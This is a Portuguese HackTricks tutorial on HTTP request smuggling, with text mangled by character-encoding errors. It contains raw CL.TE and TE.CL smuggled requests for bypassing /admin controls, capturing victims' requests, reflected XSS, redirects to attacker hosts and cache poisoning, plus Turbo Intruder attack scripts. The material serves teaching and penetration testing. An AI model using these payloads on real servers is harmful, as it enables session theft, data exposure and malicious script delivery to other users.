# HTTP Request Smuggling / Ataque de Desincroniza√ß√£o HTTP

<details>

<summary><strong>Aprenda hacking na AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

- Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
- Adquira [**produtos oficiais PEASS & HackTricks**](https://peass.creator-spring.com)
- Descubra [**A Fam√≠lia PEASS**](https://opensea.io/collection/the-peass-family), nossa cole√ß√£o exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
- **Junte-se ao** üí¨ [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-me** no **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
- **Compartilhe suas t√©cnicas de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) reposit√≥rios do github.

</details>

## O que √©

Essa vulnerabilidade ocorre quando uma **desincroniza√ß√£o** entre **proxies de front-end** e o **servidor de back-end** permite que um **atacante** envie uma **requisi√ß√£o HTTP** que ser√° **interpretada** como uma **√∫nica requisi√ß√£o** pelos **proxies de front-end** (balanceador de carga/proxy reverso) e **como 2 requisi√ß√µes** pelo **servidor de back-end**.\
Isso permite que um usu√°rio **modifique a pr√≥xima requisi√ß√£o que chega ao servidor de back-end ap√≥s a dele**.

### Teoria

[Especifica√ß√£o RFC (2161)](https://tools.ietf.org/html/rfc2616)

> Se uma mensagem for recebida com um campo de cabe√ßalho Transfer-Encoding e um campo de cabe√ßalho Content-Length, este √∫ltimo DEVE ser ignorado.

**Content-Length**

> O cabe√ßalho de entidade Content-Length indica o tamanho do corpo da entidade, em bytes, enviado ao destinat√°rio.

**Transfer-Encoding: chunked**

> O cabe√ßalho Transfer-Encoding especifica a forma de codifica√ß√£o usada para transferir com seguran√ßa o corpo da carga √∫til para o usu√°rio.\
> Chunked significa que dados grandes s√£o enviados em uma s√©rie de chunks.

### Realidade

O **Front-End** (um balanceador de carga / Proxy Reverso) **processa** o cabe√ßalho _**content-length**_ ou o cabe√ßalho _**transfer-encoding**_ e o **servidor de Back-End** **processa o outro** provocando uma **desincroniza√ß√£o** entre os 2 sistemas.\
Isso pode ser muito cr√≠tico, pois **um atacante poder√° enviar uma requisi√ß√£o** para o proxy reverso que ser√° **interpretada** pelo **servidor de back-end como 2 requisi√ß√µes diferentes**. O **perigo** dessa t√©cnica reside no fato de que o **servidor de back-end interpretar√° a 2¬™ requisi√ß√£o injetada** como se ela **viesse do pr√≥ximo cliente** e a **requisi√ß√£o real** desse cliente far√° **parte** da **requisi√ß√£o injetada**.

### Particularidades

Lembre-se de que no HTTP **um caractere de nova linha √© composto por 2 bytes:**

- **Content-Length**: Esse cabe√ßalho usa um **n√∫mero decimal** para indicar o **n√∫mero** de **bytes** do **corpo** da requisi√ß√£o. O corpo √© esperado para terminar no √∫ltimo caractere, **uma nova linha n√£o √© necess√°ria no final da requisi√ß√£o**.
- **Transfer-Encoding:** Esse cabe√ßalho usa no **corpo** um **n√∫mero hexadecimal** para indicar o **n√∫mero** de **bytes** do **pr√≥ximo chunk**. O **chunk** deve **terminar** com uma **nova linha**, mas essa nova linha **n√£o √© contada** pelo indicador de comprimento. Esse m√©todo de transfer√™ncia deve terminar com um **chunk de tamanho 0 seguido por 2 novas linhas**: `0`
- **Connection**: Com base em minha experi√™ncia, √© recomendado usar **`Connection: keep-alive`** na primeira requisi√ß√£o do Request Smuggling.

## Exemplos B√°sicos

Portanto, os ataques de request smuggling envolvem colocar tanto o cabe√ßalho `Content-Length` quanto o cabe√ßalho `Transfer-Encoding` em uma √∫nica requisi√ß√£o HTTP e manipul√°-los para que os servidores de front-end e back-end processem a requisi√ß√£o de maneira diferente. A forma exata como isso √© feito depende do comportamento dos dois servidores:

- **CL.TE**: o servidor de front-end usa o cabe√ßalho `Content-Length` e o servidor de back-end usa o cabe√ßalho `Transfer-Encoding`.
- **TE.CL**: o servidor de front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor de back-end usa o cabe√ßalho `Content-Length`.
- **TE.TE**: os servidores de front-end e back-end suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo obfuscando o cabe√ßalho de alguma forma.

### Vulnerabilidades CL.TE

Aqui, o **servidor de front-end** usa o cabe√ßalho **`Content-Length`** e o **servidor de back-end** usa o cabe√ßalho **`Transfer-Encoding`**. Podemos realizar um simples ataque de request smuggling da seguinte forma:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 30`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /404 HTTP/1.1`\
`Foo: x`

Observe como o `Content-Length` indica que o **corpo da requisi√ß√£o tem 30 bytes de comprimento** (_lembre-se que o HTTP usa uma nova linha, ent√£o 2 bytes para cada nova linha_), ent√£o o proxy reverso **enviar√° a requisi√ß√£o completa** para o back-end, e o back-end processar√° o cabe√ßalho `Transfer-Encoding`, deixando o `GET /404 HTTP/1.1` como o **in√≠cio da pr√≥xima requisi√ß√£o** (ali√°s, a pr√≥xima requisi√ß√£o ser√° anexada a `Foo:x<Pr√≥xima requisi√ß√£o come√ßa aqui>`).

### Vulnerabilidades TE.CL

Aqui, o servidor de front-end usa o cabe√ßalho `Transfer-Encoding` e o servidor de back-end usa o cabe√ßalho `Content-Length`. Podemos realizar um simples ataque de request smuggling da seguinte forma:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 4`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `7b`\ `GET /404 HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 30`\``\
`x=`\
`0`\
`\`

Neste caso, o **proxy reverso** vai **enviar toda a requisi√ß√£o** para o **back-end** conforme indicado pelo **`Transfer-encoding`**. Mas, o **back-end** vai **processar** apenas o **`7b`** (4 bytes) conforme indicado no `Content-Length`. Portanto, a pr√≥xima requisi√ß√£o ser√° aquela que come√ßa com `GET /404 HTTP/1.1`

_Obs.: mesmo que o ataque deva terminar com um `0`, a pr√≥xima requisi√ß√£o ser√° anexada como valores extras do par√¢metro **x**._\
_Tamb√©m observe que o Content-Length da requisi√ß√£o incorporada indicar√° o comprimento da pr√≥xima requisi√ß√£o que ser√° anexada ao par√¢metro **x**. Se for muito pequeno, apenas alguns bytes ser√£o anexados, e se for muito grande (maior que o comprimento da pr√≥xima requisi√ß√£o), um erro ser√° gerado para a pr√≥xima requisi√ß√£o._

### Vulnerabilidades TE.TE

Aqui, os servidores de front-end e back-end suportam o cabe√ßalho `Transfer-Encoding`, mas um dos servidores pode ser induzido a n√£o process√°-lo obfuscando o cabe√ßalho de alguma forma.\
Existem potencialmente infinitas maneiras de obfuscar o cabe√ßalho `Transfer-Encoding`. Por exemplo:

`Transfer-Encoding: xchunked`\
``\ `Transfer-Encoding : chunked`\``\
`Transfer-Encoding: chunked`\
`Transfer-Encoding: x`\
``\ `Transfer-Encoding: chunked`\ `Transfer-encoding: x`\``\
`Transfer-Encoding:[tab]chunked`\
``\ `[space]Transfer-Encoding: chunked`\``\
`X: X[\n]Transfer-Encoding: chunked`\
\`\`\
`Transfer-Encoding`\
`: chunked`

Dependendo do servidor (proxy reverso ou de apoio) que **para de processar** o cabe√ßalho **TE**, voc√™ encontrar√° uma **vulnerabilidade CL.TE** ou uma **vulnerabilidade TE.CL**.

## Encontrando HTTP Request Smuggling

### Encontrando vulnerabilidades CL.TE usando t√©cnicas de temporiza√ß√£o

Se uma aplica√ß√£o for vulner√°vel √† variante CL.TE de request smuggling, ent√£o enviar uma requisi√ß√£o como a seguinte frequentemente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
Uma vez que o servidor front-end utiliza o cabe√ßalho `Content-Length`, ele encaminhar√° apenas parte desta solicita√ß√£o, omitindo o `0`. O servidor back-end utiliza o cabe√ßalho `Transfer-Encoding`, processa o primeiro chunk e depois aguarda a chegada do pr√≥ximo chunk. Isso causar√° um atraso de tempo observ√°vel.

√Äs vezes, em vez de receber um timeout, voc√™ recebe um erro 400 bad request do host final, como no seguinte cen√°rio, onde um payload CL.TE √© enviado:

![](<../../.gitbook/assets/image (444).png>)

E a resposta √© um redirecionamento contendo um erro no corpo, inclusive a vers√£o do haproxy utilizada:

![](<../../.gitbook/assets/image (443).png>)

### Encontrando vulnerabilidades TE.CL usando t√©cnicas de temporiza√ß√£o

Se uma aplica√ß√£o for vulner√°vel √† variante TE.CL de request smuggling, enviar uma solicita√ß√£o como a seguinte frequentemente causar√° um atraso de tempo:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
Uma vez que o servidor front-end utiliza o cabe√ßalho `Transfer-Encoding`, ele encaminhar√° apenas parte dessa solicita√ß√£o, omitindo o `X`. O servidor back-end utiliza o cabe√ßalho `Content-Length`, espera mais conte√∫do no corpo da mensagem e aguarda a chegada do restante do conte√∫do. Isso causar√° um atraso de tempo observ√°vel.

### Sondando vulnerabilidades de Request Smuggling HTTP

Depois de descobrir que as **t√©cnicas de temporiza√ß√£o est√£o funcionando**, voc√™ precisa **verificar** se pode **alterar as solicita√ß√µes de outros clientes**.\
A maneira mais f√°cil de fazer isso √© tentar envenenar suas pr√≥prias solicita√ß√µes, **fazendo uma solicita√ß√£o para `/` retornar um 404, por exemplo**.\
Nos [Exemplos B√°sicos](./#basic-examples) j√° vimos exemplos de `CL.TE` e `TE.CL` de como envenenar uma solicita√ß√£o de um cliente para solicitar `/404`, provocando uma resposta 404 quando o cliente estava solicitando qualquer outro recurso.

**Notas**

Algumas considera√ß√µes importantes devem ser mantidas em mente ao tentar confirmar vulnerabilidades de request smuggling via interfer√™ncia com outras solicita√ß√µes:

* A solicita√ß√£o "de ataque" e a solicita√ß√£o "normal" devem ser enviadas ao servidor usando conex√µes de rede diferentes. Enviar ambas as solicita√ß√µes pela mesma conex√£o n√£o provar√° que a vulnerabilidade existe.
* A solicita√ß√£o "de ataque" e a solicita√ß√£o "normal" devem usar o mesmo URL e nomes de par√¢metros, na medida do poss√≠vel. Isso ocorre porque muitas aplica√ß√µes modernas roteiam solicita√ß√µes front-end para diferentes servidores back-end com base no URL e nos par√¢metros. Usar o mesmo URL e par√¢metros aumenta a chance de que as solicita√ß√µes sejam processadas pelo mesmo servidor back-end, o que √© essencial para o ataque funcionar.
* Ao testar a solicita√ß√£o "normal" para detectar qualquer interfer√™ncia da solicita√ß√£o "de ataque", voc√™ est√° em uma corrida com quaisquer outras solicita√ß√µes que a aplica√ß√£o esteja recebendo ao mesmo tempo, incluindo aquelas de outros usu√°rios. Voc√™ deve enviar a solicita√ß√£o "normal" imediatamente ap√≥s a solicita√ß√£o "de ataque". Se a aplica√ß√£o estiver ocupada, talvez seja necess√°rio realizar v√°rias tentativas para confirmar a vulnerabilidade.
* Em algumas aplica√ß√µes, o servidor front-end funciona como um balanceador de carga e encaminha solicita√ß√µes para diferentes sistemas back-end de acordo com algum algoritmo de balanceamento de carga. Se suas solicita√ß√µes "de ataque" e "normais" forem encaminhadas para diferentes sistemas back-end, o ataque falhar√°. Esta √© uma raz√£o adicional pela qual voc√™ pode precisar tentar v√°rias vezes antes que uma vulnerabilidade possa ser confirmada.
* Se seu ataque tiver sucesso em interferir em uma solicita√ß√£o subsequente, mas esta n√£o foi a solicita√ß√£o "normal" que voc√™ enviou para detectar a interfer√™ncia, isso significa que outro usu√°rio da aplica√ß√£o foi afetado pelo seu ataque. Se voc√™ continuar realizando o teste, isso poder√° ter um efeito disruptivo sobre outros usu√°rios, e voc√™ deve agir com cautela.

### For√ßando via cabe√ßalhos hop-by-hop

Abusando dos cabe√ßalhos hop-by-hop, voc√™ poderia indicar ao proxy para **excluir o cabe√ßalho Content-Length ou Transfer-Encoding para que um HTTP request smuggling seja poss√≠vel de ser abusado**.
```
Connection: Content-Length
```
Para **mais informa√ß√µes sobre cabe√ßalhos hop-by-hop**, visite:

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}

## Abusando do HTTP Request Smuggling

### Para burlar controles de seguran√ßa front-end

√Äs vezes, os **proxies front-end realizar√£o algumas verifica√ß√µes de seguran√ßa**. Voc√™ pode evit√°-los abusando do HTTP Request Smuggling, pois ser√° capaz de **burlar as prote√ß√µes**. Por exemplo, neste caso voc√™ **n√£o pode acessar `/admin` externamente** e o proxy front-end est√° verificando isso, mas este **proxy n√£o est√° verificando a solicita√ß√£o incorporada**:

**CL.TE**

`POST / HTTP/1.1`\
`Host: acb21fdd1f98c4f180c02944000100b5.web-security-academy.net`\
`Cookie: session=xht3rUYoc83NfuZkuAp8sDxzf0AZIwQr`\
`Connection: keep-alive`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 67`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`Content-Length: 10`\
\`\`\
`x=`

**TE.CL**

`POST / HTTP/1.1`\
`Host: ace71f491f52696180f41ed100d000d4.web-security-academy.net`\
`Cookie: session=Dpll5XYw4hNEu09dGccoTjHlFNx5QY1c`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 4`\
`Transfer-Encoding: chunked`\
`2b`\
`GET /admin HTTP/1.1`\
`Host: localhost`\
`a=x`\
`0`\
`\`

### Revelando a reescrita de solicita√ß√£o front-end <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Em muitas aplica√ß√µes, o **servidor front-end realiza alguma reescrita de solicita√ß√µes** antes de serem encaminhadas para o servidor back-end, geralmente adicionando alguns cabe√ßalhos de solicita√ß√£o adicionais.\
Uma coisa comum a fazer √© **adicionar ao cabe√ßalho da solicita√ß√£o** `X-Forwarded-For: <IP do cliente>` ou algum cabe√ßalho semelhante para que o back-end saiba o IP do cliente.\
√Äs vezes, se voc√™ puder **encontrar quais novos valores s√£o anexados** √† solicita√ß√£o, voc√™ pode ser capaz de **burlar prote√ß√µes** e **acessar informa√ß√µes/endpoints ocultos**.

Para descobrir como o proxy est√° reescrevendo a solicita√ß√£o, voc√™ precisa **encontrar um par√¢metro POST que o back-end refletir√° seu valor** na resposta. Em seguida, use este par√¢metro como o √∫ltimo e use um exploit como este:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 130`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
`0`\
``\ `POST /search HTTP/1.1`\ `Host: vulnerable-website.com`\ `Content-Type: application/x-www-form-urlencoded`\ `Content-Length: 100`\``\
`search=`

Neste caso, a pr√≥xima solicita√ß√£o ser√° anexada ap√≥s `search=`, que √© tamb√©m **o par√¢metro cujo valor ser√° refletido** na resposta, portanto, ele vai **refletir os cabe√ßalhos da pr√≥xima solicita√ß√£o**.

Observe que **apenas o comprimento indicado no cabe√ßalho `Content-Length` da solicita√ß√£o incorporada ser√° refletido**. Se voc√™ usar um n√∫mero baixo, apenas alguns bytes ser√£o refletidos, se voc√™ usar um n√∫mero maior do que o comprimento de todos os cabe√ßalhos, ent√£o a solicita√ß√£o incorporada lan√ßar√° um erro. Portanto, voc√™ deve **come√ßar** com um **n√∫mero pequeno** e **aument√°-lo** at√© ver tudo o que deseja ver.\
Observe tamb√©m que esta **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL**, mas a solicita√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

Finalmente, observe que neste ataque ainda estamos nos atacando para aprender como o proxy front-end est√° reescrevendo a solicita√ß√£o.

### Capturando solicita√ß√µes de outros usu√°rios <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Se voc√™ encontrar uma solicita√ß√£o POST que vai salvar o conte√∫do de um dos par√¢metros, voc√™ pode anexar a seguinte solicita√ß√£o como o valor desse par√¢metro para armazenar a solicita√ß√£o do pr√≥ximo cliente:

`POST / HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 319`\
`Connection: keep-alive`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`POST /post/comment HTTP/1.1`\
`Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net`\
`Content-Length: 659`\
`Content-Type: application/x-www-form-urlencoded`\
`Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi`\
\`\`\
`csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=HACKTRICKS&email=email%40email.com&comment=`

Neste caso, o valor do **par√¢metro coment√°rio** ser√° **salvo dentro de um coment√°rio** de uma postagem na p√°gina que √© **publicamente acess√≠vel**, ent√£o um **coment√°rio aparecer√° com o conte√∫do da pr√≥xima solicita√ß√£o**.

_Uma limita√ß√£o desta t√©cnica √© que geralmente s√≥ capturar√° dados at√© o delimitador de par√¢metros aplic√°vel √† solicita√ß√£o contrabandeada. Para envios de formul√°rios codificados em URL, isso ser√° o caractere `&`, o que significa que o conte√∫do armazenado da solicita√ß√£o do usu√°rio v√≠tima terminar√° no primeiro `&`, que pode at√© mesmo aparecer na string de consulta._

Observe tamb√©m que esta **t√©cnica tamb√©m √© explor√°vel com uma vulnerabilidade TE.CL**, mas a solicita√ß√£o deve terminar com `search=\r\n0`. No entanto, independentemente dos caracteres de nova linha, os valores ser√£o anexados ao par√¢metro de pesquisa.

### Usando HTTP request smuggling para explorar XSS refletido

Se a p√°gina da web tamb√©m for **vulner√°vel a XSS refletido**, voc√™ pode abusar do HTTP Request Smuggling para atacar os clientes da web. A explora√ß√£o de XSS refletido a partir do HTTP Request Smuggling tem algumas vantagens:

* **N√£o requer intera√ß√£o com usu√°rios v√≠timas**
* Pode ser usado para **explorar** o comportamento de XSS em partes da solicita√ß√£o que **n√£o podem ser controladas facilmente em um ataque de XSS refletido normal**, como cabe√ßalhos de solicita√ß√£o HTTP.

Se um site for vulner√°vel a XSS refletido no cabe√ßalho User-Agent, voc√™ pode usar esta carga √∫til para explor√°-lo:

`POST / HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0`\
`Cookie: session=Ro7YknOtbl3bxURHAAxZz84qj3PSMnSY`\
`Transfer-Encoding: chunked`\
`Connection: keep-alive`\
`Content-Length: 213`\
`Content-Type: application/x-www-form-urlencoded`\
``\ `0`\``\
`GET /post?postId=2 HTTP/1.1`\
`Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net`\
`User-Agent: "><script>alert(1)</script>`\
`Content-Length: 10`\
`Content-Type: application/x-www-form-urlencoded`\
\`\`\
`A=`

### Usando HTTP request smuggling para transformar um redirecionamento no local em um redirecionamento aberto <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

Muitas aplica√ß√µes realizam redirecionamentos no local de uma URL para outra e colocam o nome do host do cabe√ßalho `Host` da solicita√ß√£o no URL de redirecionamento. Um exemplo disso √© o comportamento padr√£o dos servidores web Apache e IIS, onde uma solicita√ß√£o para uma pasta sem uma barra final recebe um redirecionamento para a mesma pasta incluindo a barra final:

`GET /home HTTP/1.1`\
`Host: normal-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://normal-website.com/home/`

Esse comportamento √© normalmente considerado inofensivo, mas pode ser explorado em um ataque de smuggling para redirecionar outros usu√°rios para um dom√≠nio externo. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Content-Length: 54`\
`Connection: keep-alive`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: X`

A solicita√ß√£o contrabandeada acionar√° um redirecionamento para o site do atacante, o que afetar√° a solicita√ß√£o do pr√≥ximo usu√°rio que √© processada pelo servidor back-end. Por exemplo:

`GET /home HTTP/1.1`\
`Host: attacker-website.com`\
`Foo: XGET /scripts/include.js HTTP/1.1`\
`Host: vulnerable-website.com`\
\`\`\
`HTTP/1.1 301 Moved Permanently`\
`Location: https://attacker-website.com/home/`

Aqui, a solicita√ß√£o do usu√°rio era para um arquivo JavaScript que foi importado por uma p√°gina no site. O atacante pode comprometer totalmente o usu√°rio v√≠tima retornando seu pr√≥prio JavaScript na resposta.

### Usando HTTP request smuggling para realizar envenenamento de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

Se alguma parte da **infraestrutura front-end realizar o cache de conte√∫do** (geralmente por motivos de desempenho), **pode ser poss√≠vel envenenar esse cache modificando a resposta do servidor**.

J√° vimos como modificar o valor retornado esperado do servidor para um 404 (nos [Exemplos B√°sicos](./#basic-examples)), de forma semelhante, voc√™ poderia fazer o servidor retornar o conte√∫do de /index.html quando a solicita√ß√£o envenenada estiver pedindo por `/static/include.js`. Dessa forma, o conte√∫do do `/static/include.js` ser√° armazenado com o conte√∫do de `/index.html`, tornando `/static/include.js` inacess√≠vel para os clientes (DoS?).

Observe que isso √© ainda mais interessante se voc√™ encontrar algum **Redirecionamento Aberto** ou algum **redirecionamento no local para redirecionamento aberto** (√∫ltima se√ß√£o). Porque, voc√™ poderia ser capaz de **alterar os valores de cache** de `/static/include.js` com os **de um script controlado por voc√™** (fazendo um **XSS geral para todos os clientes** que tentarem baixar a nova vers√£o de `/static/include.js`).

Neste exemplo, ser√° mostrado como voc√™ pode explorar um **envenenamento de cache + redirecionamento no local para redirecionamento aberto** para modificar o conte√∫do do cache de `/static/include.js` para **servir c√≥digo JS controlado** pelo atacante:

`POST / HTTP/1.1`\
`Host: vulnerable.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Connection: keep-alive`\
`Content-Length: 124`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /post/next?postId=3 HTTP/1.1`\
`Host: attacker.net`\
`Content-Type: application/x-www-form-urlencoded`\
`Content-Length: 10`\
\`\`\
`x=1`

Observe como a solicita√ß√£o incorporada est√° pedindo `/post/next?postId=3`. Esta solicita√ß√£o ser√° redirecionada para `/post?postId=4` e **usar√° o valor do cabe√ßalho Host** para indicar o dom√≠nio. Portanto, voc√™ pode **modificar o cabe√ßalho Host** para apontar para o servidor do atacante e o redirecionamento usar√° esse dom√≠nio (**redirecionamento no local para redirecionamento aberto**).

Ent√£o, **ap√≥s envenenar o socket**, voc√™ precisa enviar uma **solicita√ß√£o GET** para \*\*`/static/include.js`\*\* esta solicita√ß√£o ser√° **envenenada** pela solicita√ß√£o **redirecionamento no local para redirecionamento aberto** e **pegar√° o conte√∫do do script controlado pelo atacante**.

Na pr√≥xima vez que algu√©m solicitar `/static/include.js`, o conte√∫do em cache do script do atacante ser√° servido (XSS geral).

### Usando HTTP request smuggling para realizar a decep√ß√£o de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Qual √© a diferen√ßa entre envenenamento de cache web e decep√ß√£o de cache web?**
>
> * No **envenenamento de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do malicioso no cache, e este conte√∫do √© servido do cache para outros usu√°rios da aplica√ß√£o.
> * Na **decep√ß√£o de cache web**, o atacante faz com que a aplica√ß√£o armazene algum conte√∫do sens√≠vel pertencente a outro usu√°rio no cache, e o atacante ent√£o recupera este conte√∫do do cache.

Nesta variante, o atacante contrabandeia uma solicita√ß√£o que retorna algum conte√∫do sens√≠vel espec√≠fico do usu√°rio. Por exemplo:

`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`

Se o **envenenamento atingir um cliente que estava acessando algum conte√∫do est√°tico** como `/someimage.png` que seria **armazenado em cache**. O conte√∫do de `/private/messages` da v√≠tima ser√° armazenado em `/someimage.png` e o atacante poder√° roub√°-lo.\
Observe que o **atacante n√£o sabe qual conte√∫do est√°tico o usu√°rio v√≠tima estava tentando acessar** ent√£o provavelmente a melhor maneira de testar isso √© realizar o ataque, esperar alguns segundos e **carregar todos** os conte√∫dos est√°ticos e **procurar pelos dados privados**.

### Armando o HTTP Request Smuggling com Desincroniza√ß√£o de Resposta HTTP

Voc√™ encontrou alguma vulnerabilidade de HTTP Request Smuggling e n√£o sabe como explor√°-la. Experimente este outro m√©todo de explora√ß√£o:

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts do Turbo Intruder

### CL.TE

De [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De: [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Mais informa√ß√µes

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

[Imagem daqui.](https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104)

## Ferramentas

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
* [https://github.com/bahruzjabiyev/t-reqs-http-fuzzer](https://github.com/bahruzjabiyev/t-reqs-http-fuzzer): Esta ferramenta √© um Fuzzer HTTP baseado em gram√°tica √∫til para encontrar discrep√¢ncias estranhas de smuggling de solicita√ß√£o.

## Refer√™ncias

* [https://portswigger.net/web-security/request-smuggling](https://portswigger.net/web-security/request-smuggling)
* [https://portswigger.net/web-security/request-smuggling/finding](https://portswigger.net/web-security/request-smuggling/finding)
* [https://portswigger.net/web-security/request-smuggling/exploiting](https://portswigger.net/web-security/request-smuggling/exploiting)
* [https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)
* [https://github.com/haroonawanofficial/HTTP-Desync-Attack/](https://github.com/haroonawanofficial/HTTP-Desync-Attack/)
* [https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html](https://memn0ps.github.io/2019/11/02/HTTP-Request-Smuggling-CL-TE.html)
* [https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/](https://standoff365.com/phdays10/schedule/tech/http-request-smuggling-via-higher-http-versions/)

<details>

<summary><strong>Aprenda hacking AWS do zero ao her√≥i com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras maneiras de apoiar o HackTricks:

* Se voc√™ deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
